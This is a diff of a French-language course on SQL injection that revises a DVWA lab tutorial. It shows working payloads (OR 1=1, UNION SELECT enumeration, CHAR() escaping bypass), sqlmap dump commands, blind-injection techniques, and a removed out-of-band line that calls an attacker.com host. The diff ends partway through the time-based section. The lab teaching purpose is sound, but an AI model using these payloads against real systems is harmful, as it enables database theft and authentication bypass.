@@ -1,119 +1,130 @@
-# Cours : SQL Injection (SQLi) - Exploitation DVWA et SQLMap
+# Cours : SQL Injection (SQLi) - Fondamentaux Théoriques et Exploitation Basique
 
-## Introduction
+## Objectifs pédagogiques
 
-Cette section couvre :
-- **SQL Injection** : Empoisonnement de requêtes DB avec input utilisateur [lwn](https://lwn.net/Articles/176749/)
-- **DVWA SQLi Low** : Exploitation basique `' OR 1=1; --` [wargame.braincoke](https://wargame.braincoke.fr/labs/dvwa/dvwa-sqli/)
-- **DVWA SQLi Medium** : Bypass `mysqli_real_escape_string()` [youtube](https://www.youtube.com/watch?v=IzT7BKf4tQ8)
-- **SQLMap** : Automatisation d'attaques SQLi [github](https://github.com/sqlmapproject/sqlmap/issues/2498)
-- **SQL Blind Injection** : Time-based et Boolean-based [blog.qualys](https://blog.qualys.com/product-tech/2023/02/09/blind-sql-injection-content-based-time-based-approaches)
+À l'issue de ce cours, l'étudiant sera capable de :
+- Comprendre la nature technique des vulnérabilités SQL Injection
+- Analyser les vecteurs d'attaque et leur mécanisme
+- Exploiter des vulnérabilités SQLi basiques sur un environnement contrôlé (DVWA)
+- Utiliser SQLMap pour l'automatisation des attaques
+- Distinguer les types d'injection SQL (In-band, Blind)
+- Appréhender les mécanismes de protection et leurs limites
 
-***
+---
 
-## Partie 1 : SQL Injection - Concepts fondamentaux
+## Partie 1 : Fondamentaux Théoriques
 
-### 1.1 Définition
+### 1.1 Définition et nature de SQL Injection
 
-**SQL Injection (SQLi)** : Technique d'injection de code permettant à un attaquant d'**insérer du code SQL malveillant** dans des champs de saisie utilisateur, permettant de lire, modifier, ou supprimer des données dans une base de données. [w3schools](https://www.w3schools.com/sql/sql_injection.asp)
+La SQL Injection (SQLi) est une vulnérabilité de sécurité dans les applications web permettant à un attaquant d'insérer du code SQL malveillant dans des champs de saisie utilisateur. Cette injection s'effectue par l'intermédiaire de paramètres non sécurisés (formulaires, paramètres URL, cookies) qui sont directement concaténés dans des requêtes SQL.
 
-**OWASP Top 10 2021** : **A03:2021 – Injection** (3ème position, fusion de SQLi, XSS, Command Injection).
+**Mécanisme fondamental** : L'application web ne valide pas ou n'encode pas correctement les données fournies par l'utilisateur avant de les inclure dans une requête SQL. Lorsque la base de données interprète cette requête, le code SQL injecté est exécuté, permettant à l'attaquant de manipuler la requête originale.
 
-**Impact**  : [lwn](https://lwn.net/Articles/176749/)
-- 🔴 **Authentification bypassée** : Login sans mot de passe
-- 🔴 **Lecture de données sensibles** : Dump de toutes les tables
-- 🔴 **Modification/suppression** : UPDATE, DELETE, DROP TABLE
-- 🔴 **Escalade de privilèges** : Accès admin, exécution de commandes OS
+**Classification OWASP** : SQLi appartient à la catégorie A03:2021 – Injection dans l'OWASP Top 10, ce qui souligne sa criticité dans le paysage actuel des menaces web.
 
-### 1.2 Principe de fonctionnement
+### 1.2 Contexte des bases de données relationnelles
 
-**Code vulnérable**  : [w3schools](https://www.w3schools.com/sql/sql_injection.asp)
+Pour comprendre SQLi, il est essentiel de maîtriser le fonctionnement des requêtes SQL :
 
+**Structure d'une requête SQL** :
+```sql
+SELECT colonne1, colonne2 FROM table WHERE condition
+```
+
+**Concaténation vulnérable** : Lorsque l'application concatène directement l'entrée utilisateur dans la requête :
 ```php
-<?php
-// Récupérer input utilisateur
-$username = $_POST['username'];
-$password = $_POST['password'];
-
-// Construire requête SQL (VULNÉRABLE)
-$query = "SELECT * FROM users WHERE username='" . $username . "' AND password='" . $password . "'";
-
-// Exécuter
-$result = mysqli_query($conn, $query);
-
-// Si résultat → Authentifié
-if (mysqli_num_rows($result) > 0) {
-    echo "Login successful!";
-} else {
-    echo "Invalid credentials.";
-}
-?>
+$query = "SELECT * FROM users WHERE username='" . $username . "'";
 ```
 
-**Utilisation légitime** :
-
-```
-Input:
-username: john
-password: secret123
-
-Requête générée:
-SELECT * FROM users WHERE username='john' AND password='secret123'
-
-Résultat: Authentifié si credentials corrects
+Si `$username` contient `' OR 1=1; --`, la requête devient :
+```sql
+SELECT * FROM users WHERE username='' OR 1=1; -- '
 ```
 
-**Exploitation malveillante**  : [lwn](https://lwn.net/Articles/176749/)
+### 1.3 Modèle de menace et impact
 
-```
-Input:
-username: admin' OR 1=1; --
-password: [anything]
+L'impact d'une attaque SQLi dépend directement du contexte de la requête et des permissions du compte de base de données :
 
-Requête générée:
-SELECT * FROM users WHERE username='admin' OR 1=1; -- ' AND password='...'
+| Vecteur d'attaque | Impact technique | Conséquence opérationnelle |
+|-------------------|------------------|----------------------------|
+| **Authentification bypassée** | `' OR 1=1; --` | Connexion sans mot de passe |
+| **Lecture de données sensibles** | `UNION SELECT` | Dump de toutes les tables |
+| **Modification de données** | `UPDATE` | Altération de données |
+| **Suppression de données** | `DELETE`, `DROP TABLE` | Perte de données |
+| **Escalade de privilèges** | `LOAD_FILE()`, `INTO OUTFILE` | Exécution de commandes OS |
 
-Explication:
-- admin' : Ferme la quote du username
-- OR 1=1 : Condition toujours vraie
-- ; : Fin de requête (optionnel selon DBMS)
-- -- : Commentaire SQL (ignore le reste)
-- [espace] : IMPORTANT après --
+---
 
-Résultat: Toutes les lignes retournées → Authentifié comme premier user (souvent admin) !
-```
+## Partie 2 : Typologie des Attaques SQLi
 
-### 1.3 Types d'injection SQL
+### 2.1 Analyse comparative des types
 
-| Type | Description | Exemple |
-|------|-------------|---------|
-| **In-band SQLi** | Résultat affiché directement | UNION SELECT |
-| **Blind SQLi** | Pas de résultat visible | Boolean-based, Time-based |
-| **Out-of-band SQLi** | Données exfiltrées via DNS/HTTP | `LOAD_FILE('\\attacker.com\a')` |
+La classification des attaques SQLi repose sur la manière dont les résultats sont obtenus :
 
-***
+| Type | Mécanisme | Résultat visible | Complexité |
+|------|-----------|------------------|------------|
+| **In-band SQLi** | Résultat affiché directement dans la page | Oui | Faible |
+| **Blind SQLi** | Inférence basée sur comportement de l'application | Non | Élevée |
+| **Out-of-band SQLi** | Exfiltration via canaux externes (DNS, HTTP) | Indirect | Très élevée |
 
-## Partie 2 : DVWA SQL Injection - Low Security
+### 2.2 Analyse détaillée des types
 
-### 2.1 Configuration
+#### a) In-band SQLi
 
-```
-1. DVWA → DVWA Security → Low
-2. SQL Injection
-```
+**Portée** : Les résultats de l'injection sont directement visibles dans la réponse HTTP.
 
-**Interface** :
+**Caractéristiques** :
+- Le type le plus courant et le plus facile à exploiter
+- Utilise `UNION SELECT` pour extraire des données d'autres tables
+- Nécessite que l'application affiche les résultats de la requête
 
-```
-┌─────────────────────────────────────┐
-│  User ID:                           │
-│  [________] [Submit]                │
-└─────────────────────────────────────┘
+**Exemple** :
+```sql
+1' UNION SELECT username, password FROM users; --
 ```
 
-### 2.2 Code vulnérable (Low)
+#### b) Blind SQLi
 
-**Code PHP**  : [wargame.braincoke](https://wargame.braincoke.fr/labs/dvwa/dvwa-sqli/)
+**Portée** : L'application ne retourne pas de résultats visibles, mais le comportement diffère selon la validité de la requête.
+
+**Sous-types** :
+
+1. **Boolean-based Blind SQLi** : Inférence basée sur la réponse (vrai/faux)
+2. **Time-based Blind SQLi** : Inférence basée sur des délais de réponse
+
+**Caractéristiques** :
+- Plus difficile à exploiter
+- Nécessite une extraction caractère par caractère
+- Utilise des fonctions comme `SUBSTRING()`, `SLEEP()`
+
+#### c) Out-of-band SQLi
+
+**Portée** : Les données sont exfiltrées via des canaux externes.
+
+**Caractéristiques** :
+- Très rare
+- Nécessite des fonctionnalités spécifiques du SGBD
+- Utilise `LOAD_FILE()`, `INTO OUTFILE`, ou requêtes DNS
+
+---
+
+## Partie 3 : Mise en Pratique sur DVWA
+
+### 3.1 Configuration de l'environnement
+
+DVWA (Damn Vulnerable Web Application) est une application web intentionnellement vulnérable conçue pour l'apprentissage des techniques de test d'intrusion.
+
+**Configuration initiale** :
+1. Accéder à l'interface DVWA
+2. Naviguer vers "DVWA Security"
+3. Sélectionner le niveau de sécurité : "Low"
+4. Les niveaux Medium et High implémentent des protections croissantes
+
+### 3.2 Exploitation SQLi (Low Security)
+
+#### Analyse du code vulnérable
+
+Le module SQL Injection de DVWA contient le code PHP suivant :
 
 ```php
 <?php
@@ -132,127 +143,85 @@ if (isset($_GET['id'])) {
 ?>
 ```
 
-**⚠️ Vulnérabilité** : `$id` directement injecté dans la requête sans échappement.
+**Analyse de la vulnérabilité** :
+- La variable `$id` est directement concaténée dans la requête SQL
+- Aucune validation ou échappement n'est effectué
+- Les quotes autour de `$id` permettent de manipuler la structure de la requête
 
-### 2.3 Test légitime
+#### Test de confirmation
 
-**Input** :
+**Payload de test** :
 ```
-User ID: 1
-```
-
-**URL** :
-```
-http://servertcm:8001/vulnerabilities/sqli/?id=1&Submit=Submit
+1'
 ```
 
 **Requête SQL générée** :
 ```sql
-SELECT first_name, last_name FROM users WHERE user_id = '1'
-```
-
-**Résultat** :
-```
-First name: admin
-Surname: admin
-```
-
-### 2.4 Exploitation : Test d'injection
-
-**Test 1 : Simple quote** [wargame.braincoke](https://wargame.braincoke.fr/labs/dvwa/dvwa-sqli/)
-
-```
-Input: 1'
-```
-
-**Requête** :
-```sql
 SELECT first_name, last_name FROM users WHERE user_id = '1''
 ```
 
-**Résultat** :
+**Résultat attendu** :
 ```
 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1
 ```
 
-**✅ Confirmation** : Site vulnérable à SQLi !
+**Conclusion** : L'erreur SQL confirme la vulnérabilité.
 
-**Test 2 : OR 1=1** [w3schools](https://www.w3schools.com/sql/sql_injection.asp)
+#### Exploitation basique : OR 1=1
 
-**⚠️ Important** : Sur le système, utiliser **apostrophe `'`** au lieu de guillemets `"`.
-
-**Input** :
+**Payload** :
 ```
 1' OR 1=1; --[ESPACE]
 ```
 
-**Requête SQL générée**  : [w3schools](https://www.w3schools.com/sql/sql_injection.asp)
-```sql
-SELECT first_name, last_name FROM users WHERE user_id = '1' OR 1=1; -- ' AND ...
-```
-
-**Explication détaillée** :
-
+**Requête SQL générée** :
 ```sql
 SELECT first_name, last_name FROM users WHERE user_id = '1' OR 1=1; -- '
-
-1. user_id = '1'          → Ferme la quote, recherche user_id=1
-2. OR 1=1                 → Condition TOUJOURS VRAIE
-3. ;                      → Fin de requête (optionnel)
-4. --[ESPACE]             → Commentaire SQL (ignore le reste de la requête)
 ```
 
-**Résultat** :
-```
-First name: admin
-Surname: admin
+**Analyse du payload** :
 
-First name: Gordon
-Surname: Brown
+| Séquence | Fonction |
+|----------|----------|
+| `1'` | Ferme la quote du paramètre original |
+| `OR` | Opérateur logique OU |
+| `1=1` | Condition toujours vraie |
+| `;` | Séparateur de requêtes (optionnel) |
+| `--[ESPACE]` | Commentaire SQL (ignore le reste) |
 
-First name: Hack
-Surname: Me
+**Résultat** : Toutes les lignes de la table `users` sont retournées car la condition `1=1` est toujours vraie.
 
-First name: Pablo
-Surname: Picasso
+#### Exploitation avancée : UNION SELECT
 
-First name: Bob
-Surname: Smith
-```
-
-**Succès** : Toute la table `users` affichée ! ✅
-
-### 2.5 Exploitation : UNION SELECT
-
-**Objectif** : Extraire des données d'autres tables. [lwn](https://lwn.net/Articles/176749/)
+**Principe** : L'opérateur `UNION` combine les résultats de deux requêtes SELECT.
 
 **Étape 1 : Déterminer le nombre de colonnes**
 
-**Payload** :
+Utilisation de `ORDER BY` pour identifier le nombre de colonnes :
+
 ```
 1' ORDER BY 1 --[ESPACE]
 1' ORDER BY 2 --[ESPACE]
 1' ORDER BY 3 --[ESPACE]
 ```
 
-**Résultats** :
-- `ORDER BY 1` : ✅ OK
-- `ORDER BY 2` : ✅ OK
-- `ORDER BY 3` : ❌ **Erreur** : `Unknown column '3' in 'order clause'`
+**Analyse** :
+- `ORDER BY 1` : Succès (au moins 1 colonne)
+- `ORDER BY 2` : Succès (au moins 2 colonnes)
+- `ORDER BY 3` : Erreur (moins de 3 colonnes)
 
-**Conclusion** : La requête a **2 colonnes**.
+**Conclusion** : La requête a 2 colonnes.
 
-**Étape 2 : UNION SELECT**
+**Étape 2 : Validation de UNION**
 
 **Payload** :
 ```
 1' UNION SELECT 1, 2 --[ESPACE]
 ```
 
-**Requête** :
+**Requête SQL** :
 ```sql
-SELECT first_name, last_name FROM users WHERE user_id = '1' 
-UNION SELECT 1, 2 -- '
+SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT 1, 2 -- '
 ```
 
 **Résultat** :
@@ -264,9 +233,9 @@ First name: 1
 Surname: 2
 ```
 
-**✅ Validation** : UNION fonctionne, colonnes 1 et 2 affichées.
+**Conclusion** : UNION fonctionne, les colonnes 1 et 2 sont affichées.
 
-**Étape 3 : Extraire noms de bases de données**
+**Étape 3 : Énumération des bases de données**
 
 **Payload** :
 ```
@@ -281,7 +250,9 @@ mysql
 performance_schema
 ```
 
-**Étape 4 : Extraire tables de la DB `dvwa`**
+**Note** : `information_schema` est une base de données système MySQL contenant des métadonnées sur toutes les autres bases.
+
+**Étape 4 : Énumération des tables**
 
 **Payload** :
 ```
@@ -294,7 +265,7 @@ guestbook
 users
 ```
 
-**Étape 5 : Extraire colonnes de la table `users`**
+**Étape 5 : Énumération des colonnes**
 
 **Payload** :
 ```
@@ -313,7 +284,7 @@ last_login
 failed_login
 ```
 
-**Étape 6 : Dump username + password**
+**Étape 6 : Extraction des données**
 
 **Payload** :
 ```
@@ -329,32 +300,15 @@ pablo | 0d107d09f5bbe40cade3de5c71e9e9b7
 smithy | 5f4dcc3b5aa765d61d8327deb882cf99
 ```
 
-**Succès** : Hashes MD5 des mots de passe extraits ! 🔴
+**Analyse** : Les mots de passe sont stockés sous forme de hash MD5 (ex: `5f4dcc3b5aa765d61d8327deb882cf99` = "password").
 
-***
+---
 
-## Partie 3 : DVWA SQL Injection - Medium Security
+### 3.3 Contournement de protections (Medium Security)
 
-### 3.1 Configuration
+#### Analyse du filtre
 
-```
-1. DVWA Security → Medium
-2. SQL Injection
-```
-
-**Interface modifiée** :
-
-```
-┌─────────────────────────────────────┐
-│  User ID:                           │
-│  [1 ▼] [Submit]                     │
-│  (Dropdown au lieu de text input)   │
-└─────────────────────────────────────┘
-```
-
-### 3.2 Code source (Medium)
-
-**Code PHP**  : [elhacker](https://elhacker.info/Cursos/Certified%20Ethical%20Hacker-CEHv12-Practical%20hands%20on%20Labs/7.%20Hacking%20Web%20Applications%20and%20Web%20Servers/11.1%20SQL%20Injection%20DVWA%20%20Medium%20-%20High.pdf)
+Au niveau Medium, DVWA implémente une protection basique :
 
 ```php
 <?php
@@ -373,49 +327,35 @@ if (isset($_POST['id'])) {
 ?>
 ```
 
-**Changements**  : [youtube](https://www.youtube.com/watch?v=IzT7BKf4tQ8)
-1. **Méthode POST** : Au lieu de GET
-2. **`mysqli_real_escape_string()`** : Échappe les quotes `'` et `"`
-3. **Pas de quotes autour de `$id`** : `WHERE user_id = $id` (au lieu de `'$id'`)
+**Changements** :
+- Méthode POST au lieu de GET
+- `mysqli_real_escape_string()` pour échapper les quotes
+- **Absence de quotes** autour de `$id` : `WHERE user_id = $id`
 
-**Impact de `mysqli_real_escape_string()`**  : [elhacker](https://elhacker.info/Cursos/Certified%20Ethical%20Hacker-CEHv12-Practical%20hands%20on%20Labs/7.%20Hacking%20Web%20Applications%20and%20Web%20Servers/11.1%20SQL%20Injection%20DVWA%20%20Medium%20-%20High.pdf)
+#### Impact de mysqli_real_escape_string()
+
+Cette fonction échappe les caractères spéciaux :
 
 ```php
 Input: 1' OR 1=1; --
 Après échappement: 1\' OR 1=1; --
-
-Requête générée:
-SELECT first_name, last_name FROM users WHERE user_id = 1\' OR 1=1; -- 
-→ Erreur de syntaxe
 ```
 
-### 3.3 Test d'exploitation (échoue avec quotes)
-
-**Via ZAP** :
-
-```
-1. ZAP History → Sélectionner POST /vulnerabilities/sqli/
-2. Clic droit → Open/Resend with Request Editor
-3. Modifier body : id=1' OR 1=1; --
-4. Send
+**Requête générée** :
+```sql
+SELECT first_name, last_name FROM users WHERE user_id = 1\' OR 1=1; --
 ```
 
-**Résultat** :
-```
-You have an error in your SQL syntax
-```
+**Résultat** : Erreur de syntaxe SQL.
 
-**Échec** : `mysqli_real_escape_string()` échappe les quotes ❌
+#### Technique de contournement
 
-### 3.4 Bypass : Injection sans quotes [sharpforce.gitbook](https://sharpforce.gitbook.io/cybersecurity/walkthroughs/deliberately-vulnerable/damn-vulnerable-web-application-dvwa/sql-injection/niveau-medium)
-
-**Observation clé** : La requête n'utilise **pas de quotes** autour de `$id`. [elhacker](https://elhacker.info/Cursos/Certified%20Ethical%20Hacker-CEHv12-Practical%20hands%20on%20Labs/7.%20Hacking%20Web%20Applications%20and%20Web%20Servers/11.1%20SQL%20Injection%20DVWA%20%20Medium%20-%20High.pdf)
-
+**Observation clé** : La requête n'utilise pas de quotes autour de `$id` :
 ```sql
 WHERE user_id = $id  ← Pas de quotes !
 ```
 
-**Stratégie** : Utiliser payloads **numériques** (sans quotes). [sharpforce.gitbook](https://sharpforce.gitbook.io/cybersecurity/walkthroughs/deliberately-vulnerable/damn-vulnerable-web-application-dvwa/sql-injection/niveau-medium)
+**Stratégie** : Utiliser des payloads numériques (sans quotes).
 
 **Payload** :
 ```
@@ -436,21 +376,15 @@ First name: 1
 Surname: 2
 ```
 
-**✅ Bypass réussi** : Pas besoin de quotes ! [elhacker](https://elhacker.info/Cursos/Certified%20Ethical%20Hacker-CEHv12-Practical%20hands%20on%20Labs/7.%20Hacking%20Web%20Applications%20and%20Web%20Servers/11.1%20SQL%20Injection%20DVWA%20%20Medium%20-%20High.pdf)
+**Bypass réussi** : Pas besoin de quotes car `$id` est numérique.
 
-### 3.5 Exploitation complète (Medium)
-
-**Dump databases** :
-```
-1 UNION SELECT 1, schema_name FROM information_schema.schemata
-```
-
-**Dump tables (avec CHAR pour contourner quote)**  : [sharpforce.gitbook](https://sharpforce.gitbook.io/cybersecurity/walkthroughs/deliberately-vulnerable/damn-vulnerable-web-application-dvwa/sql-injection/niveau-medium)
+#### Contournement pour les chaînes de caractères
 
 **Problème** : `table_schema='dvwa'` nécessite des quotes.
 
-**Solution** : Fonction `CHAR()`  : [sharpforce.gitbook](https://sharpforce.gitbook.io/cybersecurity/walkthroughs/deliberately-vulnerable/damn-vulnerable-web-application-dvwa/sql-injection/niveau-medium)
+**Solution** : Utiliser la fonction `CHAR()` pour convertir les codes ASCII en caractères.
 
+**Conversion** :
 ```
 d = ASCII 100
 v = ASCII 118
@@ -469,64 +403,42 @@ guestbook
 users
 ```
 
-**Dump colonnes** :
+**Extraction des colonnes** :
 ```
 1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_schema=CHAR(100,118,119,97) AND table_name=CHAR(117,115,101,114,115)
 ```
 
-**Dump credentials** :
+**Extraction des données** :
 ```
 1 UNION SELECT user, password FROM users
 ```
 
-**Succès** : Même résultat que Low, protection bypassée ! ✅
+**Leçon fondamentale** : Les filtres basés sur l'échappement des quotes sont contournables en utilisant des payloads numériques ou des fonctions de conversion.
 
-### 3.6 Fuzzing avec ZAP (tentative)
+---
 
-**Workflow** :
+## Partie 4 : Automatisation avec SQLMap
 
-```
-1. ZAP → History → POST request
-2. Clic droit → Fuzz...
-3. Highlight "id=1" dans body
-4. Add... → Type: File Fuzzers
-5. Sélectionner : fuzzdb → attack → sql-injection → detect → MySQL.txt
-6. Start Fuzzer
-```
+### 4.1 Principe de SQLMap
 
-**Résultat** : Fuzzing basique **échoue** (payloads contiennent des quotes).
+SQLMap est un outil open source d'automatisation d'attaques SQL Injection. Il détecte et exploite automatiquement les vulnérabilités SQLi.
 
-### 3.7 Active Scan ZAP (ciblé)
+**Fonctionnalités principales** :
+- Détection automatique de SQLi
+- Identification du type d'injection (In-band, Blind)
+- Énumération des bases de données, tables, colonnes
+- Extraction des données
+- Accès au système de fichiers (si permissions)
 
-**Configuration** :
+### 4.2 Préparation de la requête
 
-```
-1. ZAP → History → POST request
-2. Clic droit → Active Scan...
-3. Show advanced options
-4. Policy → Apply 'OFF' threshold to all rules
-5. Injection → SQL Injection → Threshold: Medium
-6. Start Scan
-```
+**Sauvegarde de la requête HTTP** :
 
-**Résultat** : Scan détecte la vulnérabilité mais peut prendre du temps.
+Depuis un proxy d'interception (OWASP ZAP, Burp Suite) :
+1. Capturer la requête POST vers `/vulnerabilities/sqli/`
+2. Enregistrer la requête brute dans un fichier
 
-***
-
-## Partie 4 : SQLMap - Automatisation de l'exploitation
-
-### 4.1 Préparation : Sauvegarder la requête
-
-**Depuis ZAP** :
-
-```
-1. History → POST /vulnerabilities/sqli/
-2. Clic droit → Save Raw → Request → ALL
-3. Enregistrer : ~/Documents/sqli_request.raw
-```
-
-**Contenu du fichier** :
-
+**Contenu du fichier (sqli_request.raw)** :
 ```http
 POST /vulnerabilities/sqli/ HTTP/1.1
 Host: servertcm:8001
@@ -537,88 +449,92 @@ Cookie: PHPSESSID=abc123; security=medium
 id=1&Submit=Submit
 ```
 
-### 4.2 Lancement SQLMap
+### 4.3 Détection de vulnérabilité
 
 **Commande de base** :
-
 ```bash
-sqlmap -r ~/Documents/sqli_request.raw --dbms mysql
+sqlmap -r sqli_request.raw --dbms mysql
 ```
 
 **Paramètres** :
 - `-r` : Fichier de requête HTTP brute
-- `--dbms mysql` : Spécifier le DBMS (accélère les tests)
+- `--dbms mysql` : Spécifier le SGBD (accélère les tests)
 
-**Résultat**  : [github](https://github.com/sqlmapproject/sqlmap/issues/2498)
-
+**Résultat attendu** :
 ```
-[05:46:08] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
-[05:46:08] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
-[05:46:08] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
-[05:46:08] [INFO] target URL appears to have 2 columns in query
-[05:46:08] [INFO] POST parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+[INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[INFO] target URL appears to have 2 columns in query
+[INFO] POST parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
 
-POST parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+POST parameter 'id' is vulnerable.
 ```
 
-**Explication**  : [github](https://github.com/sqlmapproject/sqlmap/issues/2519)
-- **UNION query (NULL)** : SQLMap a testé `UNION SELECT NULL, NULL` et ça a fonctionné
-- **1 to 20 columns** : SQLMap teste de 1 à 20 colonnes automatiquement
-- **Generic** : Fonctionne sans méthodes d'échappement spécifiques au DBMS [github](https://github.com/sqlmapproject/sqlmap/issues/2519)
+**Analyse** :
+- SQLMap teste automatiquement différents types d'injection
+- Il détermine le nombre de colonnes avec `ORDER BY`
+- Il confirme la vulnérabilité avec `UNION SELECT NULL, NULL`
 
-### 4.3 Test manuel de UNION
+### 4.4 Énumération et extraction
 
-**Basé sur résultat sqlmap** :
-
-```
-Input: 1 UNION SELECT NULL, NULL
-```
-
-**Requête** :
-```sql
-SELECT first_name, last_name FROM users WHERE user_id = 1 UNION SELECT NULL, NULL
-```
-
-**Résultat** :
-```
-First name: admin
-Surname: admin
-
-First name: 
-Surname: 
-```
-
-**✅ Validation** : UNION fonctionne.
-
-### 4.4 Dump complet avec SQLMap
-
-**Commande** :
-
+**Lister les bases de données** :
 ```bash
-sqlmap -r ~/Documents/sqli_request.raw --dbms mysql --dump --dbs
+sqlmap -r sqli_request.raw --dbms mysql --dbs
 ```
-
-**Paramètres** :
-- `--dump` : Dump les données des tables
-- `--dbs` : Lister les bases de données
 
 **Résultat** :
-
 ```
-available databases  [elhacker](https://elhacker.info/Cursos/Certified%20Ethical%20Hacker-CEHv12-Practical%20hands%20on%20Labs/7.%20Hacking%20Web%20Applications%20and%20Web%20Servers/11.1%20SQL%20Injection%20DVWA%20%20Medium%20-%20High.pdf):
+available databases:
 [*] information_schema
 [*] dvwa
 [*] mysql
 [*] performance_schema
 [*] sys
-
-do you want to crack them via a dictionary-based attack? [Y/n/q] n
 ```
 
-**SQLMap demande** : Voulez-vous cracker les hashes ? → **Non** (pour accélérer).
+**Lister les tables de la base dvwa** :
+```bash
+sqlmap -r sqli_request.raw --dbms mysql -D dvwa --tables
+```
 
-**Tables dumpées** :
+**Résultat** :
+```
+Database: dvwa
+[2 tables]
++-----------+
+| guestbook |
+| users     |
++-----------+
+```
 
+**Lister les colonnes de la table users** :
+```bash
+sqlmap -r sqli_request.raw --dbms mysql -D dvwa -T users --columns
+```
+
+**Résultat** :
+```
+Database: dvwa
+Table: users
+[7 columns]
++--------------+--------------+
+| Column       | Type         |
++--------------+--------------+
+| user_id      | int          |
+| user         | varchar      |
+| password     | varchar      |
+| first_name   | varchar      |
+| last_name    | varchar      |
+| avatar       | varchar      |
+| last_login   | varchar      |
++--------------+--------------+
+```
+
+**Extraire les données** :
+```bash
+sqlmap -r sqli_request.raw --dbms mysql -D dvwa -T users --dump
+```
+
+**Résultat** :
 ```
 Database: dvwa
 Table: users
@@ -634,121 +550,111 @@ Table: users
 +---------+------------+-----------+----------------------------------+
 ```
 
-**Succès** : Dump complet automatisé ! 🎯
+---
 
-***
+## Partie 5 : Blind SQL Injection
 
-## Partie 5 : SQL Blind Injection
+### 5.1 Définition et contexte
 
-### 5.1 Définition
+**Blind SQL Injection** : Type de SQLi où l'application ne retourne pas de résultats visibles (données de la requête), mais peut être exploitée en observant le comportement de l'application.
 
-**Blind SQL Injection** : Type de SQLi où l'application **ne retourne pas de résultats visibles**, mais peut être exploitée en observant le **comportement** de l'application. [owasp](https://owasp.org/www-community/attacks/Blind_SQL_Injection)
+**Contexte d'utilisation** :
+- L'application ne retourne pas les résultats de la requête
+- Les erreurs SQL ne sont pas affichées
+- Seuls des messages génériques sont retournés
 
-**Types**  : [owasp](https://owasp.org/www-community/attacks/Blind_SQL_Injection)
-1. **Boolean-based** : Vrai/Faux basé sur le contenu de la réponse
-2. **Time-based** : Délai dans la réponse basé sur une condition
+### 5.2 Boolean-based Blind SQLi
 
-### 5.2 DVWA SQL Injection (Blind) - Configuration
+**Principe** : Injecter une condition vraie ou fausse et observer la réponse de l'application.
 
+**Exemple DVWA (Blind)** :
+- Input valide : "User ID exists"
+- Input invalide : "User ID is MISSING"
+
+**Payload de test** :
 ```
-1. DVWA → SQL Injection (Blind)
-2. Security: Low ou Medium
-```
-
-**Interface** :
-
-```
-┌─────────────────────────────────────┐
-│  User ID: [________] [Submit]       │
-│                                     │
-│  (Pas de résultat affiché,          │
-│   seulement "User ID exists" ou     │
-│   "User ID is MISSING")             │
-└─────────────────────────────────────┘
+1' AND 1=1 --[ESPACE]
 ```
 
-### 5.3 Boolean-based Blind SQLi
-
-**Principe**  : Injecter une condition **vraie ou fausse** et observer la réponse. [owasp](https://owasp.org/www-community/attacks/Blind_SQL_Injection)
-
-**Payload pour déterminer nombre de colonnes**  : [stackoverflow](https://stackoverflow.com/questions/21678885/what-is-the-use-of-order-by-in-sql-injection)
-
-```
-1' ORDER BY 1 --[ESPACE]
-1' ORDER BY 2 --[ESPACE]
-1' ORDER BY 3 --[ESPACE]
-...
-1' ORDER BY X --[ESPACE]
-```
-
-**Logique**  : [stackoverflow](https://stackoverflow.com/questions/21678885/what-is-the-use-of-order-by-in-sql-injection)
-- Incrémenter `X` jusqu'à obtenir une **erreur**
-- Si `ORDER BY 5` → OK, `ORDER BY 6` → Erreur → **5 colonnes**
-
-**Exemple** :
-
-```
-Input: 1' ORDER BY 1 --[ESPACE]
-Réponse: User ID exists
-
-Input: 1' ORDER BY 2 --[ESPACE]
-Réponse: User ID exists
-
-Input: 1' ORDER BY 3 --[ESPACE]
-Réponse: User ID is MISSING
-```
-
-**Conclusion** : **2 colonnes** dans la requête.
-
-**Extraction de données caractère par caractère**  : [owasp](https://owasp.org/www-community/attacks/Blind_SQL_Injection)
-
+**Requête SQL** :
 ```sql
--- Test si premier caractère du username est 'a'
+SELECT first_name, last_name FROM users WHERE user_id = '1' AND 1=1 -- '
+```
+
+**Analyse** :
+- `1=1` est toujours vrai
+- La condition `WHERE` est vraie
+- Résultat : "User ID exists"
+
+**Payload de test** :
+```
+1' AND 1=2 --[ESPACE]
+```
+
+**Requête SQL** :
+```sql
+SELECT first_name, last_name FROM users WHERE user_id = '1' AND 1=2 -- '
+```
+
+**Analyse** :
+- `1=2` est toujours faux
+- La condition `WHERE` est fausse
+- Résultat : "User ID is MISSING"
+
+**Extraction de données caractère par caractère** :
+
+Pour extraire le premier caractère du premier username :
+```sql
 1' AND SUBSTRING((SELECT user FROM users LIMIT 1), 1, 1) = 'a' --[ESPACE]
-
--- Si "User ID exists" → Premier caractère est 'a'
--- Sinon → Essayer 'b', 'c', etc.
 ```
 
-### 5.4 Time-based Blind SQLi
+**Analyse** :
+- `SUBSTRING()` extrait une partie d'une chaîne
+- `LIMIT 1` sélectionne la première ligne
+- Si le premier caractère est 'a', la condition est vraie → "User ID exists"
+- Sinon, la condition est fausse → "User ID is MISSING"
 
-**Principe**  : Injecter une requête qui provoque un **délai** si une condition est vraie. [blog.qualys](https://blog.qualys.com/product-tech/2023/02/09/blind-sql-injection-content-based-time-based-approaches)
+**Processus d'extraction** :
+1. Tester 'a' → Si faux, tester 'b'
+2. Continuer jusqu'à trouver le bon caractère
+3. Répéter pour chaque position du caractère
+4. Répéter pour chaque ligne
 
-**Fonction SQL** : `SLEEP()` (MySQL). [pentest.co](https://pentest.co.uk/labs/time-based-blind-sql-injection-soplanning/)
+### 5.3 Time-based Blind SQLi
 
-**Payload de base**  : [pentest.co](https://pentest.co.uk/labs/time-based-blind-sql-injection-soplanning/)
+**Principe** : Injecter une requête qui provoque un délai si une condition est vraie.
 
-```sql
+**Fonction SQL** : `SLEEP()` (MySQL)
+
